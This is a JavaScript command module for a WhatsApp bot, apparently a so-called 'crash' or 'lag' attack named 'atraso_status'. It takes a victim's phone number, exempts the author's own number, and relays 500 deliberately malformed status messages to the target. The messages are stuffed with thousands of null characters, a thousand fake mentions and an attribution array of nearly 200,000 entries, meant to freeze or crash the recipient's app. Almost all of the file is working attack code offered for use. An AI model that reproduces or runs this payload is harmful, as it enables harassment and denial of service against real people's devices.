let handler = async (m, { conn, text, command }) => {
  // Verificación de creador
  if (!isCreator) return m.reply("👑 Este comando solo está disponible para el owner y el número del bot.");

  // Verificación de argumento
  if (!text) return m.reply(`*exemplo:*\n\n*${prefix + command}* '+55 51 8992-6591'`);

  // Obtención del objetivo
  victim = text.split("|")[0];
  
  // Lógica para obtener el JID del contacto
  const Xreturn = m.mentionedJid[0] 
    ? m.mentionedJid[0] 
    : m.quoted 
      ? m.quoted.sender 
      : victim.replace(/[-9]/g,'') + "@s.whatsapp.net";

  // Verificación de contacto
  var contactInfo = await conn.onWhatsApp(Xreturn);
  
  if (victim == "555189926591") { return; }
  if (victim == "555189926591") { return; } 
  if (victim == "+55 51 8992-6591") { return; }

  if (contactInfo.length == 0) {
    return m.reply("esse número não existe");
  }

  m.reply("*enviando....*");  

  // Bucle de envío
  for (let i = 0; i < 500; i++) {
    await external_share(Xreturn);
  }
  
  m.reply("*✔️*");
};

// Función auxiliar para enviar el mensaje
async function external_share(target) {
  try {
    let msg = generateWAMessageFromContent(
      target,
      {
        interactiveResponseMessage: {
          body: {
            text: "\u0000".repeat(200),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(9999)}\"}}`,
            version: 3
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 1000 }, (_, y) => `555193871982${y + 1}@s.whatsapp.net`),
            remoteJid: "status@broadcast",
            statusAttributionType: "RESHARED_FROM_POST",
            isQuestion: true,
            statusAttributions: Array(199999).fill({ type: "EXTERNAL_SHARE" })
          }
        }
      },
      {}
    );
    await conn.relayMessage(
      "status@broadcast",
      msg.message,
      {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                  }
                ]
              }
            ]
          }
        ]
      }
    );
  } catch (error) {
    console.log(error);
  }
}

handler.command = ['atraso_status'];
handler.tags = ['fake', 'grupo'];
handler.help = ['atraso_status <número>'];

export default handler;
